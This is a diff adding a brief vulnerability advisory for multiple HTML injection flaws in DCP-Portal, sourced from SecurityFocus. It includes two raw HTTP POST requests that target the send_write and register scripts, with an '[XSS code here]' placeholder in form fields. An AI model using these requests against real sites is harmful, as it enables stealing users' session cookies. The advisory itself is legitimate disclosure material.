@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/11339/info
+
+DCP-Portal is reported prone to multiple HTML injection vulnerabilities. It is reported that DCP-Portal does not sufficiently filter data submitted via input fields in several scripts.
+
+These vulnerabilities may permit execution of hostile script code when a user views pages that include the injected code. The hostile code would be rendered in the context of the site hosting the vulnerable software. Exploitation could allow for theft of cookie-based authentication credentials. Other attacks are also possible since the attacker may influence how pages within the DCP-Portal are rendered to users.
+
+POST /index.php?page=send_write HTTP/1.1
+Host: dcp-portal
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+
+PHPSESSID=1&yname=1&yadd=1&fname=1&fadd=1&url=[XSS code here]
+
+
+POST /register.php HTTP/1.1
+Host: dcp-portal
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 137
+
+PHPSESSID=1&sex=1&sex=1&name=1&surname=1&email=example@example.com&ad
+dress=1&zip=1&city=1&country=[XSS code here]
